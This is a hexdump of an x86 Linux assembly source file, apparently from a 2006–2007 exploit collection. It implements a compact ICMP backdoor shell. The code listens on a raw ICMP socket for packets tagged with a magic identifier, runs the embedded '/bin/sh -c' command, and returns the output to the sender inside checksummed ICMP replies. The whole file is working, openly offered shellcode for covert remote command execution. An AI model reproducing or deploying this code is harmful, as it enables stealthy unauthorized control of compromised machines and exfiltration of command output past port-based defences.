00000000  3b 0d 0a 3b 20 43 6f 70  79 72 69 67 68 74 20 28  |;..; Copyright (|
00000010  63 29 20 32 30 30 37 20  62 79 20 3c 6d 75 2d 62  |c) 2007 by <mu-b|
00000020  40 64 69 67 69 74 2d 6c  61 62 73 2e 6f 72 67 3e  |@digit-labs.org>|
00000030  0d 0a 3b 0d 0a 3b 20 32  33 35 2d 62 79 74 65 20  |..;..; 235-byte |
00000040  72 61 77 2d 73 6f 63 6b  65 74 20 49 43 4d 50 2f  |raw-socket ICMP/|
00000050  63 68 65 63 6b 73 75 6d  20 73 68 65 6c 6c 20 2d  |checksum shell -|
00000060  20 28 78 38 36 2d 6c 6e  78 29 0d 0a 3b 20 62 79  | (x86-lnx)..; by|
00000070  20 6d 75 2d 62 20 2d 20  4e 6f 76 20 32 30 30 36  | mu-b - Nov 2006|
00000080  0d 0a 3b 0d 0a 3b 20 69  63 6d 70 20 77 69 74 68  |..;..; icmp with|
00000090  20 69 64 65 6e 74 69 66  69 65 72 20 5f 5f 66 6c  | identifier __fl|
000000a0  61 67 5f 62 79 74 65 20  61 6e 64 20 63 6f 6d 6d  |ag_byte and comm|
000000b0  61 6e 64 73 20 69 6e 20  74 68 65 0d 0a 3b 20 66  |ands in the..; f|
000000c0  6f 6c 6c 6f 77 69 6e 67  20 66 6f 72 6d 61 74 3a  |ollowing format:|
000000d0  2d 0d 0a 3b 20 20 20 20  20 20 20 22 2f 62 69 6e  |-..;       "/bin|
000000e0  2f 73 68 5c 78 30 30 2d  63 5c 78 30 30 3c 63 6f  |/sh\x00-c\x00<co|
000000f0  6d 6d 61 6e 64 20 68 65  72 65 3e 5c 78 30 30 22  |mmand here>\x00"|
00000100  0d 0a 3b 0d 0a 3b 20 75  6e 6c 69 6b 65 20 2a 6f  |..;..; unlike *o|
00000110  74 68 65 72 2a 20 69 63  6d 70 20 73 68 65 6c 6c  |ther* icmp shell|
00000120  73 2c 20 74 68 69 73 20  77 69 6c 6c 20 72 65 70  |s, this will rep|
00000130  6c 79 20 77 69 74 68 0d  0a 3b 20 32 35 35 2d 28  |ly with..; 255-(|
00000140  73 69 7a 65 6f 66 20 69  63 6d 70 5f 68 64 72 29  |sizeof icmp_hdr)|
00000150  20 62 79 74 65 73 20 6f  66 20 6f 75 74 70 75 74  | bytes of output|
00000160  2e 2e 0d 0a 3b 0d 0a 0d  0a 25 64 65 66 69 6e 65  |....;....%define|
00000170  20 7a 65 72 6f 5f 72 65  67 20 20 20 20 20 20 20  | zero_reg       |
00000180  20 65 73 69 0d 0a 25 64  65 66 69 6e 65 20 7a 65  | esi..%define ze|
00000190  72 6f 5f 72 65 67 5f 77  20 20 20 20 20 20 73 69  |ro_reg_w      si|
000001a0  0d 0a 25 64 65 66 69 6e  65 20 73 6f 63 6b 5f 72  |..%define sock_r|
000001b0  65 67 20 20 20 20 20 20  20 20 65 64 69 0d 0a 25  |eg        edi..%|
000001c0  64 65 66 69 6e 65 20 5f  5f 66 6c 61 67 5f 62 79  |define __flag_by|
000001d0  74 65 20 20 20 20 20 36  39 39 36 68 0d 0a 0d 0a  |te     6996h....|
000001e0  67 6c 6f 62 61 6c 20 5f  73 68 65 6c 6c 0d 0a 0d  |global _shell...|
000001f0  0a 5f 73 68 65 6c 6c 3a  0d 0a 20 78 6f 72 20 20  |._shell:.. xor  |
00000200  20 7a 65 72 6f 5f 72 65  67 2c 20 7a 65 72 6f 5f  | zero_reg, zero_|
00000210  72 65 67 0d 0a 20 6d 6f  76 20 20 20 65 62 70 2c  |reg.. mov   ebp,|
00000220  20 65 73 70 0d 0a 0d 0a  20 3b 20 73 6f 63 6b 66  | esp.... ; sockf|
00000230  64 20 3d 20 73 6f 63 6b  65 74 28 50 46 5f 49 4e  |d = socket(PF_IN|
00000240  45 54 2c 20 53 4f 43 4b  5f 52 41 57 2c 20 49 50  |ET, SOCK_RAW, IP|
00000250  50 52 4f 54 4f 5f 49 43  4d 50 29 3b 0d 0a 5f 73  |PROTO_ICMP);.._s|
00000260  6f 63 6b 65 74 3a 0d 0a  20 6c 65 61 20 20 20 65  |ocket:.. lea   e|
00000270  62 78 2c 20 5b 7a 65 72  6f 5f 72 65 67 2b 33 5d  |bx, [zero_reg+3]|
00000280  0d 0a 20 70 75 73 68 20  20 62 79 74 65 20 31 0d  |.. push  byte 1.|
00000290  0a 20 70 75 73 68 20 20  65 62 78 0d 0a 20 64 65  |. push  ebx.. de|
000002a0  63 20 20 20 65 62 78 0d  0a 20 70 75 73 68 20 20  |c   ebx.. push  |
000002b0  65 62 78 0d 0a 20 64 65  63 20 20 20 65 62 78 0d  |ebx.. dec   ebx.|
000002c0  0a 20 6d 6f 76 20 20 20  65 63 78 2c 20 65 73 70  |. mov   ecx, esp|
000002d0  0d 0a 20 6c 65 61 20 20  20 65 61 78 2c 20 5b 7a  |.. lea   eax, [z|
000002e0  65 72 6f 5f 72 65 67 2b  36 36 68 5d 0d 0a 20 69  |ero_reg+66h].. i|
000002f0  6e 74 20 20 20 38 30 68  20 20 20 20 20 20 20 20  |nt   80h        |
00000300  20 20 20 20 20 20 20 20  20 3b 20 73 6f 63 6b 65  |         ; socke|
00000310  74 28 29 3b 0d 0a 20 6d  6f 76 20 20 20 73 6f 63  |t();.. mov   soc|
00000320  6b 5f 72 65 67 2c 20 65  61 78 0d 0a 0d 0a 20 3b  |k_reg, eax.... ;|
00000330  20 73 65 74 73 6f 63 6b  6f 70 74 28 73 6f 63 6b  | setsockopt(sock|
00000340  66 64 2c 20 49 50 50 52  4f 54 4f 5f 49 50 2c 20  |fd, IPPROTO_IP, |
00000350  49 50 5f 48 44 52 49 4e  43 4c 2c 20 26 31 2c 20  |IP_HDRINCL, &1, |
00000360  31 29 3b 0d 0a 5f 73 65  74 73 6f 63 6b 6f 70 74  |1);.._setsockopt|
00000370  3a 0d 0a 20 70 75 73 68  20 20 65 62 78 0d 0a 20  |:.. push  ebx.. |
00000380  70 75 73 68 20 20 65 73  70 0d 0a 20 70 75 73 68  |push  esp.. push|
00000390  20 20 62 79 74 65 20 33  68 0d 0a 20 70 75 73 68  |  byte 3h.. push|
000003a0  20 20 7a 65 72 6f 5f 72  65 67 0d 0a 20 70 75 73  |  zero_reg.. pus|
000003b0  68 20 20 73 6f 63 6b 5f  72 65 67 0d 0a 20 6d 6f  |h  sock_reg.. mo|
000003c0  76 20 20 20 65 63 78 2c  20 65 73 70 0d 0a 20 6d  |v   ecx, esp.. m|
000003d0  6f 76 20 20 20 62 6c 2c  20 62 79 74 65 20 30 65  |ov   bl, byte 0e|
000003e0  68 0d 0a 20 6d 6f 76 20  20 20 61 6c 2c 20 62 79  |h.. mov   al, by|
000003f0  74 65 20 36 36 68 0d 0a  20 69 6e 74 20 20 20 38  |te 66h.. int   8|
00000400  30 68 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0h              |
00000410  20 20 20 3b 20 73 65 74  73 6f 63 6b 65 74 6f 70  |   ; setsocketop|
00000420  74 28 29 3b 0d 0a 0d 0a  20 3b 20 77 68 69 6c 65  |t();.... ; while|
00000430  28 31 29 0d 0a 5f 77 68  69 6c 65 5f 6c 6f 6f 70  |(1).._while_loop|
00000440  3a 0d 0a 20 3b 20 72 65  61 64 28 73 6f 63 6b 66  |:.. ; read(sockf|
00000450  64 2c 20 63 6d 64 2c 20  32 35 35 29 3b 0d 0a 20  |d, cmd, 255);.. |
00000460  63 64 71 0d 0a 20 64 65  63 20 20 20 62 79 74 65  |cdq.. dec   byte|
00000470  20 64 6c 0d 0a 20 6d 6f  76 20 20 20 65 63 78 2c  | dl.. mov   ecx,|
00000480  20 65 62 70 0d 0a 20 6d  6f 76 20 20 20 65 62 78  | ebp.. mov   ebx|
00000490  2c 20 73 6f 63 6b 5f 72  65 67 0d 0a 20 6c 65 61  |, sock_reg.. lea|
000004a0  20 20 20 65 61 78 2c 20  5b 7a 65 72 6f 5f 72 65  |   eax, [zero_re|
000004b0  67 2b 33 5d 0d 0a 20 69  6e 74 20 20 20 38 30 68  |g+3].. int   80h|
000004c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004d0  20 3b 20 72 65 61 64 28  29 3b 0d 0a 0d 0a 20 6c  | ; read();.... l|
000004e0  65 61 20 20 20 65 62 78  2c 20 5b 65 62 70 2b 32  |ea   ebx, [ebp+2|
000004f0  34 5d 0d 0a 20 78 6f 72  20 20 20 5b 65 62 78 5d  |4].. xor   [ebx]|
00000500  2c 20 77 6f 72 64 20 5f  5f 66 6c 61 67 5f 62 79  |, word __flag_by|
00000510  74 65 0d 0a 20 6a 6e 65  20 20 20 73 68 6f 72 74  |te.. jne   short|
00000520  20 5f 77 68 69 6c 65 5f  6c 6f 6f 70 0d 0a 0d 0a  | _while_loop....|
00000530  20 3b 20 70 69 70 65 28  70 70 29 0d 0a 20 6c 65  | ; pipe(pp).. le|
00000540  61 20 20 20 65 62 78 2c  20 5b 65 62 70 2d 38 5d  |a   ebx, [ebp-8]|
00000550  0d 0a 20 6d 6f 76 20 20  20 61 6c 2c 20 62 79 74  |.. mov   al, byt|
00000560  65 20 32 61 68 0d 0a 20  69 6e 74 20 20 20 38 30  |e 2ah.. int   80|
00000570  68 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |h               |
00000580  20 20 3b 20 70 69 70 65  28 29 3b 0d 0a 0d 0a 20  |  ; pipe();.... |
00000590  3b 20 66 6f 72 6b 28 29  0d 0a 20 6d 6f 76 20 20  |; fork().. mov  |
000005a0  20 61 6c 2c 20 62 79 74  65 20 32 68 0d 0a 20 69  | al, byte 2h.. i|
000005b0  6e 74 20 20 20 38 30 68  20 20 20 20 20 20 20 20  |nt   80h        |
000005c0  20 20 20 20 20 20 20 20  20 3b 20 66 6f 72 6b 28  |         ; fork(|
000005d0  29 3b 0d 0a 20 74 65 73  74 20 20 65 61 78 2c 20  |);.. test  eax, |
000005e0  65 61 78 0d 0a 20 6a 6e  7a 20 20 20 73 68 6f 72  |eax.. jnz   shor|
000005f0  74 20 5f 70 61 72 65 6e  74 0d 0a 0d 0a 5f 63 68  |t _parent...._ch|
00000600  69 6c 64 3a 0d 0a 20 3b  20 63 6c 6f 73 65 28 70  |ild:.. ; close(p|
00000610  70 5b 30 5d 29 0d 0a 20  6d 6f 76 20 20 20 65 62  |p[0]).. mov   eb|
00000620  78 2c 20 5b 65 62 70 2d  38 5d 0d 0a 20 6d 6f 76  |x, [ebp-8].. mov|
00000630  20 20 20 61 6c 2c 20 62  79 74 65 20 36 68 0d 0a  |   al, byte 6h..|
00000640  20 69 6e 74 20 20 20 38  30 68 20 20 20 20 20 20  | int   80h      |
00000650  20 20 20 20 20 20 20 20  20 20 20 3b 20 63 6c 6f  |           ; clo|
00000660  73 65 28 29 3b 0d 0a 0d  0a 20 3b 20 64 75 70 32  |se();.... ; dup2|
00000670  28 70 70 5b 31 5d 2c 20  30 29 3b 20 64 75 70 32  |(pp[1], 0); dup2|
00000680  28 70 70 5b 31 5d 2c 20  31 29 3b 20 64 75 70 32  |(pp[1], 1); dup2|
00000690  28 70 70 5b 31 5d 2c 20  32 29 3b 0d 0a 20 6c 65  |(pp[1], 2);.. le|
000006a0  61 20 20 20 65 63 78 2c  20 5b 7a 65 72 6f 5f 72  |a   ecx, [zero_r|
000006b0  65 67 2b 33 5d 0d 0a 20  3b 20 70 70 5b 31 5d 20  |eg+3].. ; pp[1] |
000006c0  3d 3d 20 70 70 5b 30 5d  2b 31 0d 0a 20 69 6e 63  |== pp[0]+1.. inc|
000006d0  20 20 20 65 62 78 0d 0a  0d 0a 2e 31 3a 0d 0a 20  |   ebx.....1:.. |
000006e0  64 65 63 20 20 20 65 63  78 0d 0a 20 6d 6f 76 20  |dec   ecx.. mov |
000006f0  20 20 61 6c 2c 20 62 79  74 65 20 33 66 68 0d 0a  |  al, byte 3fh..|
00000700  20 69 6e 74 20 20 20 38  30 68 20 20 20 20 20 20  | int   80h      |
00000710  20 20 20 20 20 20 20 20  20 20 20 3b 20 64 75 70  |           ; dup|
00000720  32 28 29 3b 0d 0a 20 6a  6e 7a 20 20 20 2e 31 0d  |2();.. jnz   .1.|
00000730  0a 0d 0a 20 3b 20 65 78  65 63 76 65 28 63 6d 64  |... ; execve(cmd|
00000740  20 2b 20 32 38 2c 20 7b  63 6d 64 20 2b 20 32 38  | + 28, {cmd + 28|
00000750  2c 20 63 6d 64 20 2b 20  33 36 2c 20 63 6d 64 20  |, cmd + 36, cmd |
00000760  2b 20 33 39 2c 20 30 7d  2c 20 30 29 3b 0d 0a 20  |+ 39, 0}, 0);.. |
00000770  70 75 73 68 20 20 7a 65  72 6f 5f 72 65 67 0d 0a  |push  zero_reg..|
00000780  20 6c 65 61 20 20 20 65  62 78 2c 20 5b 65 62 70  | lea   ebx, [ebp|
00000790  2b 33 39 5d 0d 0a 20 70  75 73 68 20 20 65 62 78  |+39].. push  ebx|
000007a0  0d 0a 20 73 75 62 20 20  20 65 62 78 2c 20 62 79  |.. sub   ebx, by|
000007b0  74 65 20 33 0d 0a 20 70  75 73 68 20 20 65 62 78  |te 3.. push  ebx|
000007c0  0d 0a 20 73 75 62 20 20  20 65 62 78 2c 20 62 79  |.. sub   ebx, by|
000007d0  74 65 20 38 0d 0a 20 70  75 73 68 20 20 65 62 78  |te 8.. push  ebx|
000007e0  0d 0a 20 6d 6f 76 20 20  20 65 63 78 2c 20 65 73  |.. mov   ecx, es|
000007f0  70 0d 0a 20 63 64 71 0d  0a 20 6d 6f 76 20 20 20  |p.. cdq.. mov   |
00000800  61 6c 2c 20 62 79 74 65  20 30 62 68 0d 0a 20 69  |al, byte 0bh.. i|
00000810  6e 74 20 20 20 38 30 68  20 20 20 20 20 20 20 20  |nt   80h        |
00000820  20 20 20 20 20 20 20 20  20 3b 20 65 78 65 63 76  |         ; execv|
00000830  65 28 29 3b 0d 0a 0d 0a  5f 70 61 72 65 6e 74 3a  |e();...._parent:|
00000840  0d 0a 20 3b 20 63 6c 6f  73 65 28 70 70 5b 31 5d  |.. ; close(pp[1]|
00000850  29 0d 0a 20 6d 6f 76 20  20 20 65 62 78 2c 20 5b  |).. mov   ebx, [|
00000860  65 62 70 2d 34 5d 0d 0a  20 6c 65 61 20 20 20 65  |ebp-4].. lea   e|
00000870  61 78 2c 20 5b 7a 65 72  6f 5f 72 65 67 2b 36 5d  |ax, [zero_reg+6]|
00000880  0d 0a 20 69 6e 74 20 20  20 38 30 68 20 20 20 20  |.. int   80h    |
00000890  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 63  |             ; c|
000008a0  6c 6f 73 65 28 29 3b 0d  0a 0d 0a 5f 70 61 72 65  |lose();...._pare|
000008b0  6e 74 5f 72 65 61 64 3a  0d 0a 2e 31 3a 0d 0a 20  |nt_read:...1:.. |
000008c0  3b 20 72 65 61 64 28 70  70 5b 30 5d 2c 20 63 6d  |; read(pp[0], cm|
000008d0  64 2c 20 62 79 74 65 73  5f 6c 65 66 74 29 3b 0d  |d, bytes_left);.|
000008e0  0a 20 3b 20 65 64 78 20  3d 3d 20 32 35 35 0d 0a  |. ; edx == 255..|
000008f0  20 6c 65 61 20 20 20 65  63 78 2c 20 5b 65 62 70  | lea   ecx, [ebp|
00000900  2b 32 38 5d 0d 0a 20 6d  6f 76 20 20 20 65 62 78  |+28].. mov   ebx|
00000910  2c 20 5b 65 62 70 2d 38  5d 0d 0a 20 6d 6f 76 20  |, [ebp-8].. mov |
00000920  20 20 61 6c 2c 20 62 79  74 65 20 33 68 0d 0a 20  |  al, byte 3h.. |
00000930  69 6e 74 20 20 20 38 30  68 20 20 20 20 20 20 20  |int   80h       |
00000940  20 20 20 20 20 20 20 20  20 20 3b 20 72 65 61 64  |          ; read|
00000950  28 29 3b 0d 0a 20 74 65  73 74 20 20 65 61 78 2c  |();.. test  eax,|
00000960  20 65 61 78 0d 0a 20 6a  6c 20 20 20 20 5f 77 68  | eax.. jl    _wh|
00000970  69 6c 65 5f 6c 6f 6f 70  0d 0a 0d 0a 20 6d 6f 76  |ile_loop.... mov|
00000980  20 20 20 61 6c 2c 20 62  79 74 65 20 36 68 0d 0a  |   al, byte 6h..|
00000990  20 69 6e 74 20 20 20 38  30 68 20 20 20 20 20 20  | int   80h      |
000009a0  20 20 20 20 20 20 20 20  20 20 20 3b 20 63 6c 6f  |           ; clo|
000009b0  73 65 28 29 3b 0d 0a 0d  0a 2e 32 3a 0d 0a 20 3b  |se();.....2:.. ;|
000009c0  20 66 69 78 20 75 70 20  74 74 6c 20 28 6f 70 74  | fix up ttl (opt|
000009d0  69 6f 6e 61 6c 3f 21 20  6d 61 6b 65 20 73 75 72  |ional?! make sur|
000009e0  65 20 69 74 73 20 68 69  67 68 21 29 0d 0a 20 3b  |e its high!).. ;|
000009f0  20 6d 6f 76 20 20 20 5b  65 62 70 2b 38 5d 2c 20  | mov   [ebp+8], |
00000a00  62 79 74 65 20 30 66 66  68 0d 0a 0d 0a 20 3b 20  |byte 0ffh.... ; |
00000a10  73 77 69 74 63 68 20 69  70 27 73 0d 0a 20 6d 6f  |switch ip's.. mo|
00000a20  76 20 20 20 65 63 78 2c  20 5b 65 62 70 2b 31 32  |v   ecx, [ebp+12|
00000a30  5d 0d 0a 20 78 63 68 67  20 20 5b 65 62 70 2b 31  |].. xchg  [ebp+1|
00000a40  36 5d 2c 20 65 63 78 0d  0a 20 6d 6f 76 20 20 20  |6], ecx.. mov   |
00000a50  5b 65 62 70 2b 31 32 5d  2c 20 65 63 78 0d 0a 0d  |[ebp+12], ecx...|
00000a60  0a 20 3b 20 73 65 74 20  69 63 6d 70 20 74 79 70  |. ; set icmp typ|
00000a70  65 20 74 6f 20 65 63 68  6f 20 72 65 70 6c 79 20  |e to echo reply |
00000a80  28 6f 70 74 69 6f 6e 61  6c 3f 21 29 0d 0a 20 3b  |(optional?!).. ;|
00000a90  6d 6f 76 20 20 20 5b 65  62 70 2b 32 30 5d 2c 20  |mov   [ebp+20], |
00000aa0  77 6f 72 64 20 7a 65 72  6f 5f 72 65 67 5f 77 0d  |word zero_reg_w.|
00000ab0  0a 20 3b 20 7a 65 72 6f  20 63 68 65 63 6b 73 75  |. ; zero checksu|
00000ac0  6d 0d 0a 20 3b 6d 6f 76  20 20 20 5b 65 62 70 2b  |m.. ;mov   [ebp+|
00000ad0  32 32 5d 2c 20 77 6f 72  64 20 7a 65 72 6f 5f 72  |22], word zero_r|
00000ae0  65 67 5f 77 0d 0a 20 3b  20 73 65 74 20 69 63 6d  |eg_w.. ; set icm|
00000af0  70 20 74 79 70 65 20 74  6f 20 65 63 68 6f 20 61  |p type to echo a|
00000b00  6e 64 20 7a 65 72 6f 20  63 68 65 63 6b 73 75 6d  |nd zero checksum|
00000b10  0d 0a 20 6d 6f 76 20 20  20 5b 65 62 70 2b 32 30  |.. mov   [ebp+20|
00000b20  5d 2c 20 7a 65 72 6f 5f  72 65 67 0d 0a 0d 0a 20  |], zero_reg.... |
00000b30  6c 65 61 20 20 20 65 63  78 2c 20 5b 7a 65 72 6f  |lea   ecx, [zero|
00000b40  5f 72 65 67 2b 31 31 37  5d 0d 0a 20 6c 65 61 20  |_reg+117].. lea |
00000b50  20 20 65 73 69 2c 20 5b  65 62 70 2b 32 30 5d 0d  |  esi, [ebp+20].|
00000b60  0a 20 63 64 71 0d 0a 0d  0a 2e 33 3a 0d 0a 20 6c  |. cdq.....3:.. l|
00000b70  6f 64 73 77 0d 0a 20 61  64 64 20 20 20 65 64 78  |odsw.. add   edx|
00000b80  2c 20 65 61 78 0d 0a 20  6c 6f 6f 70 20 20 2e 33  |, eax.. loop  .3|
00000b90  0d 0a 0d 0a 20 6c 6f 64  73 62 0d 0a 20 78 6f 72  |.... lodsb.. xor|
00000ba0  20 20 20 61 68 2c 20 61  68 0d 0a 20 61 64 64 20  |   ah, ah.. add |
00000bb0  20 20 65 61 78 2c 20 65  64 78 0d 0a 20 6d 6f 76  |  eax, edx.. mov|
00000bc0  20 20 20 65 73 69 2c 20  65 61 78 0d 0a 0d 0a 20  |   esi, eax.... |
00000bd0  73 68 72 20 20 20 65 61  78 2c 20 62 79 74 65 20  |shr   eax, byte |
00000be0  31 36 0d 0a 20 6d 6f 76  7a 78 20 65 73 69 2c 20  |16.. movzx esi, |
00000bf0  73 69 0d 0a 20 61 64 64  20 20 20 65 61 78 2c 20  |si.. add   eax, |
00000c00  65 73 69 0d 0a 20 6d 6f  76 20 20 20 65 64 78 2c  |esi.. mov   edx,|
00000c10  20 65 61 78 0d 0a 20 73  68 72 20 20 20 65 64 78  | eax.. shr   edx|
00000c20  2c 20 62 79 74 65 20 31  36 0d 0a 20 61 64 64 20  |, byte 16.. add |
00000c30  20 20 65 61 78 2c 20 65  64 78 0d 0a 20 6e 6f 74  |  eax, edx.. not|
00000c40  20 20 20 61 78 0d 0a 0d  0a 20 3b 20 73 65 74 20  |   ax.... ; set |
00000c50  63 68 65 63 6b 73 75 6d  0d 0a 20 6d 6f 76 20 20  |checksum.. mov  |
00000c60  20 5b 65 62 70 2b 32 32  5d 2c 20 77 6f 72 64 20  | [ebp+22], word |
00000c70  61 78 0d 0a 0d 0a 20 63  64 71 0d 0a 20 78 6f 72  |ax.... cdq.. xor|
00000c80  20 20 20 65 61 78 2c 20  65 61 78 0d 0a 20 78 6f  |   eax, eax.. xo|
00000c90  72 20 20 20 7a 65 72 6f  5f 72 65 67 2c 20 7a 65  |r   zero_reg, ze|
00000ca0  72 6f 5f 72 65 67 0d 0a  0d 0a 20 3b 20 73 74 72  |ro_reg.... ; str|
00000cb0  75 63 74 20 73 6f 63 6b  61 64 64 72 20 2a 0d 0a  |uct sockaddr *..|
00000cc0  20 70 75 73 68 20 20 7a  65 72 6f 5f 72 65 67 0d  | push  zero_reg.|
00000cd0  0a 20 70 75 73 68 20 20  7a 65 72 6f 5f 72 65 67  |. push  zero_reg|
00000ce0  0d 0a 20 70 75 73 68 20  20 64 77 6f 72 64 20 5b  |.. push  dword [|
00000cf0  65 62 70 2b 31 36 5d 0d  0a 20 70 75 73 68 20 20  |ebp+16].. push  |
00000d00  62 79 74 65 20 32 0d 0a  0d 0a 20 3b 20 73 65 6e  |byte 2.... ; sen|
00000d10  64 74 6f 28 73 6f 63 6b  66 64 2c 20 63 6d 64 2c  |dto(sockfd, cmd,|
00000d20  20 32 35 35 2c 20 30 2c  20 2e 2e 2e 29 3b 0d 0a  | 255, 0, ...);..|
00000d30  20 6d 6f 76 20 20 20 65  63 78 2c 20 65 73 70 0d  | mov   ecx, esp.|
00000d40  0a 20 70 75 73 68 20 20  62 79 74 65 20 31 36 0d  |. push  byte 16.|
00000d50  0a 20 70 75 73 68 20 20  65 63 78 0d 0a 20 70 75  |. push  ecx.. pu|
00000d60  73 68 20 20 7a 65 72 6f  5f 72 65 67 0d 0a 20 6d  |sh  zero_reg.. m|
00000d70  6f 76 20 20 20 64 6c 2c  20 62 79 74 65 20 30 66  |ov   dl, byte 0f|
00000d80  66 68 0d 0a 20 70 75 73  68 20 20 65 64 78 0d 0a  |fh.. push  edx..|
00000d90  20 70 75 73 68 20 20 65  62 70 0d 0a 20 70 75 73  | push  ebp.. pus|
00000da0  68 20 20 73 6f 63 6b 5f  72 65 67 0d 0a 20 6d 6f  |h  sock_reg.. mo|
00000db0  76 20 20 20 65 63 78 2c  20 65 73 70 0d 0a 20 6d  |v   ecx, esp.. m|
00000dc0  6f 76 20 20 20 62 6c 2c  20 30 62 68 0d 0a 20 6d  |ov   bl, 0bh.. m|
00000dd0  6f 76 20 20 20 61 6c 2c  20 36 36 68 0d 0a 20 69  |ov   al, 66h.. i|
00000de0  6e 74 20 20 20 38 30 68  20 20 20 20 20 20 20 20  |nt   80h        |
00000df0  20 20 20 20 20 20 20 20  20 3b 20 73 65 6e 64 74  |         ; sendt|
00000e00  6f 28 29 3b 0d 0a 0d 0a  20 63 64 71 0d 0a 20 6d  |o();.... cdq.. m|
00000e10  6f 76 20 20 20 65 63 78  2c 20 65 62 70 0d 0a 20  |ov   ecx, ebp.. |
00000e20  6d 6f 76 20 20 20 65 62  78 2c 20 7a 65 72 6f 5f  |mov   ebx, zero_|
00000e30  72 65 67 0d 0a 20 6d 6f  76 20 20 20 61 6c 2c 20  |reg.. mov   al, |
00000e40  37 32 68 0d 0a 20 69 6e  74 20 20 20 38 30 68 20  |72h.. int   80h |
00000e50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000e60  3b 20 77 61 69 74 28 29  3b 0d 0a 0d 0a 20 6a 6d  |; wait();.... jm|
00000e70  70 20 20 20 5f 77 68 69  6c 65 5f 6c 6f 6f 70     |p   _while_loop|
00000e7f
